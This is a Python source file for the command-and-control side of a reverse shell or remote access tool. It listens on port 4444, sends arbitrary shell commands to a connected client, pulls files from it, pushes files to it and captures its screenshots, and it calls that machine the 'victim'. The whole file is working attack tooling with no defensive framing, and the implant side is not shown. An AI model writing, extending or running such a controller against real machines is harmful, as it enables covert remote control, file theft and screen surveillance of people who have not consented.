import socket

try: 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    print ("Socket successfully created")
except socket.error as err: 
    print ("socket creatsion failed with error %s" %(err))

port=4444

#ensure socket is closed from previous session
s.close()
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


s.bind(('192.168.68.114', port))         
print ("socket binded to %s" %(port)) 
s.listen(5)     
print ("socket is listening")            
c, addr = s.accept()
print ('Got connection from', addr ) 

while True: 
# Establish connection with client.
	user_command=str(input("input command:"))
	#sanitize user input
	user_command=user_command.replace("\n","")

	if user_command=="end":
		c.send(user_command.encode())
		break
	elif user_command=="download":
		c.send(user_command.encode())
		file_name=str(input("input file name:"))
		c.send(file_name.encode())
		with open(file_name, "wb") as f:
			data=c.recv(1024)
			f.write(data)
	elif user_command=="send":
		c.send(user_command.encode())
		file_name=str(input("input file name:"))
		c.send(file_name.encode())
		with open(file_name, "rb") as f:
			data=f.read()
			c.send(data)
	elif user_command=="screenshot":
		c.send(user_command.encode())
		
		# Read the incoming 16-byte size header
		file_size = int(c.recv(16).decode())
		
		received_data = bytearray()
		while len(received_data) < file_size:
			packet = c.recv(4096)
			if not packet:
				break
			received_data.extend(packet)
			
		with open("received_screenshot.png", "wb") as f:
			f.write(received_data)
		print("Screenshot received completely.")
	else:
		c.send(user_command.encode())
		#if no output was received, print error message
		output=c.recv(1024).decode()
		if output=="No output" or output=="":
			print("Error: No output received from victim.")
		else:
			print(output)
